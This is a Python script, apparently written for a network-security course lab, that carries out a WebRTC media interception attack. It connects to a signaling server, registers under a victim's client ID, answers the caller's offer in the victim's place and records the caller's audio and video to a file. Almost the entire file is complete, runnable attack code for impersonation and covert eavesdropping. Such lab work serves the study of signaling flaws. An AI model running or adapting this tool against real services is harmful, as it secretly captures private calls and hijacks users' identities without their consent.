#!/usr/bin/env python3
"""
interceptor_webrtc.py

Advanced attacker for NS_A2 - Part 2.3 (Media Interception)

This script:
  1. Connects to the signaling server as a WebSocket client.
  2. Registers using the victim's clientId (e.g., "client-a").
  3. Waits for a WebRTC "offer" from the caller (e.g., "client-b").
  4. Creates an RTCPeerConnection using aiortc.
  5. Sends an "answer" back through the signaling server.
  6. Handles ICE candidates (from and to the browser).
  7. Receives media (audio/video) and saves it to a file.

It DOES NOT show live video. Instead, it records the incoming stream to
an .mp4 file (or any other format supported by ffmpeg / av).
"""

import argparse
import asyncio
import json
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

import websockets
from websockets import WebSocketClientProtocol

from aiortc import (
    RTCPeerConnection,
    RTCSessionDescription,
    RTCIceCandidate,
    RTCConfiguration,
    RTCIceServer,
)
from aiortc.contrib.media import MediaRecorder


# ---------------------------------------------------------------------------
# Utility helpers
# ---------------------------------------------------------------------------

def utc_timestamp() -> str:
    """
    Return a human-readable UTC timestamp (ISO 8601) with Z suffix.
    Example: '2025-11-20T23:01:38Z'
    """
    return datetime.now(timezone.utc).isoformat(timespec="seconds").replace("+00:00", "Z")


def log(msg: str) -> None:
    """
    Consistent logging helper: prefixes every line with a UTC timestamp.
    """
    print(f"[{utc_timestamp()}] {msg}")


@dataclass
class AttackConfig:
    """
    Configuration for the media interception attack.

    Attributes:
        server_url   : WebSocket signaling server URL (e.g. ws://localhost:8080)
        victim_id    : The clientId we want to hijack (e.g. 'client-a')
        display_name : Optional display name we send in the registration meta field
        output_file  : Path where the received media will be recorded
    """
    server_url: str
    victim_id: str
    display_name: Optional[str]
    output_file: Path


# ---------------------------------------------------------------------------
# Core attack logic
# ---------------------------------------------------------------------------

async def handle_offer_and_media(
    ws: WebSocketClientProtocol,
    cfg: AttackConfig,
    offer_message: dict,
) -> None:
    """
    Handle a single WebRTC offer from the signaling server:

    1. Parse the SDP offer and caller's clientId ("from" field).
    2. Create an RTCPeerConnection + MediaRecorder.
    3. Set the remote description (offer), generate an answer,
       set the local description.
    4. Send the answer back to the caller through the signaling server.
    5. Keep the connection alive to receive media and handle ICE candidates.
    """

    # ------------------------------------------------------------------
    # 1. Extract essential fields from the offer
    # ------------------------------------------------------------------
    sdp: str = offer_message.get("sdp", "")
    from_client: Optional[str] = offer_message.get("from")

    if not sdp:
        log("[!] Received 'offer' message WITHOUT SDP. Cannot proceed.")
        return

    if not from_client:
        log("[!] Received 'offer' message WITHOUT 'from' field. Cannot respond.")
        return

    log(f"[+] Intercepted WebRTC offer from caller '{from_client}' "
        f"intended for victim '{cfg.victim_id}'.")

    # ------------------------------------------------------------------
    # 2. Prepare output directory + MediaRecorder
    # ------------------------------------------------------------------
    output_path = cfg.output_file
    output_path.parent.mkdir(parents=True, exist_ok=True)
    log(f"[*] Recorded media will be saved to: '{output_path}'")

    recorder = MediaRecorder(str(output_path))

    # ------------------------------------------------------------------
    # 3. Create RTCPeerConnection
    # ------------------------------------------------------------------
    # We use a very simple RTCConfiguration. You could add STUN/TURN here
    # if the topology required it, but for localhost lab testing it's fine.
    rtc_config = RTCConfiguration(iceServers=[RTCIceServer(urls=["stun:stun.l.google.com:19302"])])
    pc = RTCPeerConnection(rtc_config)

    log("[*] RTCPeerConnection created.")

    # This will be updated once we know the caller ID (we already do).
    remote_client_id = from_client

    # Flag to track whether recorder has been started.
    recorder_started = False

    # ------------------------------------------------------------------
    # 4. Event handlers on the peer connection
    # ------------------------------------------------------------------

    @pc.on("track")
    async def on_track(track):
        """
        Called whenever a remote media track (audio or video) is received
        from the browser (Client B).
        """
        nonlocal recorder_started

        log(f"[+] New incoming media track: kind='{track.kind}'")

        # Attach this track to the recorder so that its media is captured.
        recorder.addTrack(track)
        log("[*] Track attached to MediaRecorder.")

        # Start the recorder once, on the first track.
        if not recorder_started:
            log("[*] Starting MediaRecorder ...")
            await recorder.start()
            recorder_started = True
            log("[+] MediaRecorder started.")

        @track.on("ended")
        async def on_ended():
            """
            Called when the track ends (e.g., browser stops sending media).
            """
            log(f"[!] Track '{track.kind}' ended.")

    @pc.on("icecandidate")
    def on_icecandidate(candidate):
        """
        Called when the local ICE agent finds a new candidate that should be
        sent to the remote peer (Client B) via the signaling server.
        """
        if candidate is None:
            # None is sent when gathering is complete.
            log("[*] Local ICE gathering complete.")
            return

        if not remote_client_id:
            # In theory we always know it by now, but guard anyway.
            log("[!] Local ICE candidate generated but remote_client_id is unknown; ignoring.")
            return

        candidate_payload = {
            "to": remote_client_id,
            "type": "ice",
            "candidate": {
                "candidate": candidate.component and candidate.__dict__.get("candidate", None)
                or candidate.__dict__.get("candidate", ""),
                "sdpMid": candidate.sdpMid,
                "sdpMLineIndex": candidate.sdpMLineIndex,
                # usernameFragment is optional; aiortc may or may not expose it.
                "usernameFragment": getattr(candidate, "usernameFragment", None),
            },
        }

        msg_text = json.dumps(candidate_payload)
        log(f"[C → S] Sending local ICE candidate to '{remote_client_id}': {msg_text}")

        # We cannot use 'await' here because this is a sync callback.
        # Instead, schedule the send operation in the event loop.
        asyncio.create_task(ws.send(msg_text))

    # ------------------------------------------------------------------
    # 5. Set the remote description (offer) and create an answer
    # ------------------------------------------------------------------
    offer = RTCSessionDescription(sdp=sdp, type="offer")
    await pc.setRemoteDescription(offer)
    log("[+] Remote description (offer) set on RTCPeerConnection.")

    # Create an SDP answer that matches the offered media sections.
    log("[*] Creating SDP answer ...")
    answer = await pc.createAnswer()
    await pc.setLocalDescription(answer)
    log("[+] Local description (answer) set.")

    # ------------------------------------------------------------------
    # 6. Send the 'answer' message via signaling server
    # ------------------------------------------------------------------
    answer_payload = {
        "to": from_client,
        "type": "answer",
        "sdp": pc.localDescription.sdp,
    }
    answer_text = json.dumps(answer_payload)
    log(f"[C → S] Sending intercepted SDP answer back to caller '{from_client}'.")
    await ws.send(answer_text)

    log("[+] SDP answer sent. Waiting for ICE candidates and media ...")

    # ------------------------------------------------------------------
    # 7. Inner loop: process subsequent signaling messages (ICE)
    #
    # IMPORTANT: This function DOES NOT return immediately. It continues
    # to listen to the signaling channel to:
    #   - add remote ICE candidates,
    #   - detect when the WebSocket is closed,
    #   - keep the peer connection alive while media is flowing.
    # ------------------------------------------------------------------

    try:
        while True:
            raw_msg = await ws.recv()
            log(f"[S → C] Raw signaling message (post-offer): {raw_msg}")

            try:
                msg = json.loads(raw_msg)
            except json.JSONDecodeError:
                log("[!] Non-JSON signaling message received; ignoring.")
                continue

            msg_type = msg.get("type")
            msg_to = msg.get("to")

            # Ignore messages not addressed to 'us' (victim_id / attacker id)
            if msg_to != cfg.victim_id:
                continue

            # Handle incoming remote ICE candidates
            if msg_type == "ice":
                cand_obj = msg.get("candidate")
                if not cand_obj:
                    log("[!] 'ice' message without 'candidate' field; ignoring.")
                    continue

                try:
                    candidate = RTCIceCandidate(
                        sdpMid=cand_obj.get("sdpMid"),
                        sdpMLineIndex=cand_obj.get("sdpMLineIndex"),
                        candidate=cand_obj.get("candidate"),
                    )
                    log(f"[+] Adding remote ICE candidate from '{msg.get('from', 'unknown')}': "
                        f"{cand_obj}")
                    await pc.addIceCandidate(candidate)
                except Exception as e:
                    log(f"[!] Failed to add remote ICE candidate: {e}")

            elif msg_type == "offer":
                # Depending on the WebRTC app, renegotiation offers may appear.
                # For simplicity, we log them and ignore renegotiation.
                log("[*] Additional 'offer' received after initial negotiation; "
                    "ignoring (no renegotiation implemented).")

            else:
                # Other message types (bye, etc.) can be logged for debugging.
                log(f"[*] Ignoring signaling message of type '{msg_type}'.")

    except websockets.exceptions.ConnectionClosedOK:
        log("[*] WebSocket connection closed cleanly.")
    except websockets.exceptions.ConnectionClosedError as e:
        log(f"[!] WebSocket connection closed with error: {e}")
    finally:
        log("[*] Cleaning up: stopping recorder and closing RTCPeerConnection.")
        if recorder_started:
            await recorder.stop()
            log("[+] MediaRecorder stopped.")
        await pc.close()
        log("[+] RTCPeerConnection closed.")


async def run_attack(cfg: AttackConfig) -> None:
    """
    Top-level coroutine for the media interception attack:

    1. Connect to the signaling server via WebSocket.
    2. Register using victim_id (impersonation).
    3. Wait for the first WebRTC 'offer' addressed to victim_id.
    4. Delegate to handle_offer_and_media() to set up the RTC connection
       and receive media.
    """

    log(f"[*] Starting WebRTC media interception attack:")
    log(f"    - server_url   = {cfg.server_url}")
    log(f"    - victim_id    = {cfg.victim_id}")
    log(f"    - display_name = {cfg.display_name or '(auto-generated)'}")
    log(f"    - output_file  = {cfg.output_file}")

    # ----------------------------------------------------------------------
    # 1. Connect to the signaling server as a WebSocket client
    # ----------------------------------------------------------------------
    log(f"[*] Connecting to signaling server at '{cfg.server_url}' ...")
    async with websockets.connect(cfg.server_url) as ws:
        log("[+] Connected to signaling server.")

        # ------------------------------------------------------------------
        # 2. Send registration message impersonating victim_id
        # ------------------------------------------------------------------
        display_name = cfg.display_name or f"webrtc-attacker-{cfg.victim_id}"
        register_msg = {
            "type": "register",
            "clientId": cfg.victim_id,
            "meta": {
                "displayName": display_name,
            },
        }

        msg_text = json.dumps(register_msg)
        log(f"[C → S] Registration message (impersonating '{cfg.victim_id}'): {msg_text}")
        await ws.send(msg_text)

        # Wait for the server's response, expecting {"type":"registered","clientId":...}
        log("[*] Waiting for registration confirmation from server ...")
        raw_resp = await ws.recv()
        log(f"[S → C] Raw registration response: {raw_resp}")

        try:
            resp = json.loads(raw_resp)
        except json.JSONDecodeError:
            log("[!] Registration response is not valid JSON; aborting attack.")
            return

        if resp.get("type") != "registered" or resp.get("clientId") != cfg.victim_id:
            log("[!] Unexpected registration response; "
                "server did NOT confirm us as the victim. Aborting.")
            return

        log(f"[+] Successfully registered as victim clientId='{cfg.victim_id}'.")
        log("[*] Waiting to intercept the first WebRTC 'offer' ...")

        # ------------------------------------------------------------------
        # 3. Wait until we receive the first 'offer' addressed to victim_id
        # ------------------------------------------------------------------
        while True:
            raw_msg = await ws.recv()
            log(f"[S → C] Raw signaling message: {raw_msg}")

            try:
                msg = json.loads(raw_msg)
            except json.JSONDecodeError:
                log("[!] Non-JSON signaling message received; ignoring.")
                continue

            msg_type = msg.get("type")
            msg_to = msg.get("to")

            # We only care about 'offer' messages that are addressed to us
            if msg_type == "offer" and msg_to == cfg.victim_id:
                log("[+] First WebRTC offer for victim intercepted. "
                    "Starting media interception flow.")
                await handle_offer_and_media(ws, cfg, msg)
                # Once handle_offer_and_media returns, we exit the attack.
                break
            else:
                # For debugging it can be useful to see what else is flowing.
                log(f"[*] Ignoring signaling message type='{msg_type}', to='{msg_to}'.")


# ---------------------------------------------------------------------------
# Entry point and CLI argument parsing
# ---------------------------------------------------------------------------

def parse_args() -> AttackConfig:
    """
    Parse command-line arguments and build an AttackConfig.
    """
    parser = argparse.ArgumentParser(
        description=(
            "Advanced WebRTC media interception attacker for NS_A2 (Task 2.3).\n"
            "Connects to the signaling server, hijacks a victim's registration, "
            "intercepts the WebRTC offer, and records media to a file."
        )
    )

    parser.add_argument(
        "--server-url",
        default="ws://localhost:8080",
        help="WebSocket signaling server URL (default: ws://localhost:8080)",
    )

    parser.add_argument(
        "--victim-id",
        default="client-a",
        help="clientId to hijack (default: client-a)",
    )

    parser.add_argument(
        "--display-name",
        default=None,
        help=(
            "Optional displayName sent in the registration meta field. "
            "If omitted, a descriptive name will be generated automatically."
        ),
    )

    parser.add_argument(
        "--output",
        default="recordings/intercepted_media.mp4",
        help=(
            "Output path (relative or absolute) for recorded media. "
            "Default: recordings/intercepted_media.mp4"
        ),
    )

    args = parser.parse_args()

    cfg = AttackConfig(
        server_url=args.server_url,
        victim_id=args.victim_id,
        display_name=args.display_name,
        output_file=Path(args.output),
    )
    return cfg


def main() -> None:
    """
    Synchronous entry point that:
      1. Parses CLI arguments into an AttackConfig.
      2. Runs the asynchronous attack logic with asyncio.
    """
    cfg = parse_args()

    try:
        asyncio.run(run_attack(cfg))
    except KeyboardInterrupt:
        log("[!] Attack interrupted by user (Ctrl+C). Exiting.")


if __name__ == "__main__":
    main()
